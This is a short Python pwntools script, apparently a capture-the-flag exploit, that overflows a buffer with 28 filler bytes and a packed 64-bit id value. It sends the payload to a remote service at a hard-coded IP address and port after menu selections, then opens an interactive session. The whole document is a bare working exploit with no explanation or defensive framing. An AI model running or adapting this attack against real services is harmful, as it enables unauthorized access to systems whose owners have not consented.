from pwn import *

id = 80085

payload = b'A'*(28) + p64(id)
c = remote('35.184.182.18', 32001)


c.recvline()
c.sendline(b"1")
c.sendline(payload)
c.sendline(b"3")
c.interactive()
